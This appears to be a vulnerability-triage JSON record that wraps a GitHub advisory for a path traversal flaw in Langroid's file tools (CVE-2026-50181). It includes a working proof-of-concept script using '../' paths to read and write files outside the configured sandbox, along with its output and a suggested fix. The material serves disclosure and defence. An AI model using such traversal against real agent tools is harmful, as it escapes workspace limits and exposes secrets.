@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/97582002?v=4\", \"events_url\": \"https://api.github.com/users/chaitanyagarware/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/chaitanyagarware/followers\", \"following_url\": \"https://api.github.com/users/chaitanyagarware/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/chaitanyagarware/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/chaitanyagarware\", \"id\": 97582002, \"login\": \"chaitanyagarware\", \"node_id\": \"U_kgDOBdD7sg\", \"organizations_url\": \"https://api.github.com/users/chaitanyagarware/orgs\", \"received_events_url\": \"https://api.github.com/users/chaitanyagarware/received_events\", \"repos_url\": \"https://api.github.com/users/chaitanyagarware/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/chaitanyagarware/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/chaitanyagarware/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/chaitanyagarware\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-50181\", \"cvss\": {\"score\": 7.1, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.1, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}, {\"cwe_id\": \"CWE-23\", \"name\": \"Relative Path Traversal\"}], \"description\": \"### Summary\\n\\nLangroid's `ReadFileTool` and `WriteFileTool` appear to treat `curr_dir` as the intended working-directory boundary for file operations. However, the tools only change the process working directory to `curr_dir` and then operate on the user-supplied `file_path` without resolving and enforcing that the final path remains inside `curr_dir`.\\n\\nAs a result, a tool caller can supply path traversal sequences such as `../secret.txt` to read files outside the configured current directory, or `../written_by_tool.txt` to write files outside that directory.\\n\\nThis can impact applications that expose Langroid file tools to an LLM agent, user-controlled tool call, or delegated coding/documentation agent while relying on `curr_dir` to restrict file access to a project/workspace directory.\\n\\n### Details\\n\\nAffected components:\\n\\n- `langroid/agent/tools/file_tools.py`\\n- `langroid/utils/system.py`\\n\\nRelevant behavior observed:\\n\\n`ReadFileTool` contains a comment indicating the intended assumption:\\n\\n```text\\n# ASSUME: file_path should be relative to the curr_dir\\n\\nThe tool then changes into the configured current directory and calls read_file(self.file_path).\\n\\nWriteFileTool similarly resolves curr_dir, changes into that directory, and calls create_file(self.file_path, self.content).\\n\\nThe issue is that changing the process working directory does not prevent traversal. A path such as ../secret.txt is still valid and resolves outside the configured curr_dir.\\n\\nIn local testing, ReadFileTool successfully read a file outside the configured sandbox directory, and WriteFileTool successfully wrote a file outside the configured sandbox directory.\\n\\nPoC\\n\\nTested locally against the current Langroid repository checkout.\\n\\nEnvironment:\\n\\nPython 3.12\\nLangroid installed in editable mode with pip install -e .\\n\\nPoC script:\\n\\nfrom pathlib import Path\\nfrom tempfile import TemporaryDirectory\\nimport os\\n\\nos.environ[\\\"docker\\\"] = \\\"false\\\"\\nos.environ[\\\"DOCKER\\\"] = \\\"false\\\"\\n\\nfrom langroid.agent.tools.file_tools import ReadFileTool, WriteFileTool\\n\\n\\nclass DummyIndex:\\n    def add(self, files):\\n        print(\\\"dummy git add:\\\", files)\\n\\n    def commit(self, message):\\n        print(\\\"dummy git commit:\\\", message)\\n\\n\\nclass DummyRepo:\\n    index = DummyIndex()\\n\\n\\nwith TemporaryDirectory() as root:\\n    base = Path(root)\\n    sandbox = base / \\\"sandbox\\\"\\n    sandbox.mkdir()\\n\\n    secret = base / \\\"secret.txt\\\"\\n    secret.write_text(\\\"LANGROID_TOOL_ESCAPE_PROOF\\\", encoding=\\\"utf-8\\\")\\n\\n    ReadSandbox = ReadFileTool.create(get_curr_dir=lambda: sandbox)\\n    read_tool = ReadSandbox(file_path=\\\"../secret.txt\\\")\\n\\n    print(\\\"READ TOOL RESULT:\\\")\\n    print(read_tool.handle())\\n\\n    WriteSandbox = WriteFileTool.create(\\n        get_curr_dir=lambda: sandbox,\\n        get_git_repo=lambda: DummyRepo(),\\n    )\\n\\n    write_tool = WriteSandbox(\\n        file_path=\\\"../written_by_tool.txt\\\",\\n        content=\\\"WRITTEN_BY_LANGROID_TOOL\\\",\\n        language=\\\"text\\\",\\n    )\\n\\n    print(\\\"WRITE TOOL RESULT:\\\")\\n    print(write_tool.handle())\\n\\n    outside = base / \\\"written_by_tool.txt\\\"\\n    print(\\\"outside exists:\\\", outside.exists())\\n    print(\\\"outside content:\\\", outside.read_text(encoding=\\\"utf-8\\\"))\\n\\nObserved output:\\n\\nREAD TOOL RESULT:\\n\\n    CONTENTS of ../secret.txt:\\n    (Line numbers added for reference only!)\\n    ---------------------------\\n    1: LANGROID_TOOL_ESCAPE_PROOF\\n\\nWRITE TOOL RESULT:\\nContent created/updated in: ..\\\\written_by_tool.txt\\ndummy git add: ['../written_by_tool.txt']\\ndummy git commit: Agent write file tool\\nContent written to ../written_by_tool.txt and committed\\noutside exists: True\\noutside content: WRITTEN_BY_LANGROID_TOOL\\n\\nThis demonstrates that both read and write operations can escape the configured curr_dir using ../ traversal.\\n\\nImpact\\n\\nIf an application enables Langroid's file tools and treats curr_dir as a project, workspace, repository, or sandbox boundary, a tool caller can escape that boundary.\\n\\nPotential impact includes:\\n\\nReading files outside the intended workspace.\\nWriting files outside the intended workspace.\\nExposing local secrets, configuration files, source files, environment files, or other project-adjacent files.\\nModifying files outside the intended project directory if WriteFileTool is enabled.\\n\\nThis is especially relevant in agentic workflows where an LLM or external user can influence tool arguments.\\n\\nThis report does not claim unauthenticated remote exploitation by default. The impact depends on how an application exposes Langroid file tools and whether curr_dir is intended to restrict file access.\\n\\nSuggested remediation\\n\\nBefore reading, writing, or listing files, resolve the configured base directory and the requested target path, then reject any path that escapes the base directory.\\n\\nExample patch pattern:\\n\\nfrom pathlib import Path\\n\\ndef safe_join(base_dir: str | Path, user_path: str | Path) -> Path:\\n    base = Path(base_dir).resolve()\\n    target = (base / user_path).resolve()\\n\\n    if target != base and base not in target.parents:\\n        raise ValueError(\\\"Path escapes configured current directory\\\")\\n\\n    return target\\n\\nThen use the resolved safe path for ReadFileTool, WriteFileTool, and ListDirTool.\\n\\nSuggested regression tests:\\n\\nReadFileTool(file_path=\\\"../secret.txt\\\") should be rejected.\\nWriteFileTool(file_path=\\\"../outside.txt\\\") should be rejected.\\nAbsolute paths outside curr_dir should be rejected.\\nSymlink-based escapes should be rejected after final path resolution.\\nNormal relative paths inside curr_dir, such as src/main.py, should continue to work.\\n\\n[Langroid CVE Report.pdf](https://github.com/user-attachments/files/28333958/Langroid.CVE.Report.pdf)\", \"epss\": {\"percentage\": 0.00184, \"percentile\": 0.08172}, \"ghsa_id\": \"GHSA-fg23-3346-88f5\", \"github_reviewed_at\": \"2026-07-02T17:38:03Z\", \"html_url\": \"https://github.com/advisories/GHSA-fg23-3346-88f5\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-fg23-3346-88f5\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-50181\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-02T17:38:03Z\", \"references\": [\"https://github.com/langroid/langroid/security/advisories/GHSA-fg23-3346-88f5\", \"https://github.com/langroid/langroid/commit/56e2756ecab70a70a7e6edbee2f2187b8484683e\", \"https://github.com/advisories/GHSA-fg23-3346-88f5\"], \"repository_advisory_url\": \"https://api.github.com/repos/langroid/langroid/security-advisories/GHSA-fg23-3346-88f5\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/langroid/langroid\", \"summary\": \"Langroid: Path traversal in the file tools allows read/write outside configured current directory\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-02T17:38:06Z\", \"url\": \"https://api.github.com/advisories/GHSA-fg23-3346-88f5\", \"vulnerabilities\": [{\"first_patched_version\": \"0.64.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"langroid\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.63.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-fg23-3346-88f5",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "langroid: <= 0.63.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-50181"
+    ],
+    "cvss_score": 7.1,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "langroid"
+    ],
+    "remote": false,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:56.266127Z",
+  "provenance": {
+    "content_sha256": "1bb2e81c1babb1d555b9e98901467c38b1f4cf07758cb9809fe784696550d48d",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-02T17:38:03Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-fg23-3346-88f5",
+  "status": "active",
+  "title": "Langroid: Path traversal in the file tools allows read/write outside configured current directory",
+  "updated_at": "2026-07-02T17:38:06Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-fg23-3346-88f5"
+}
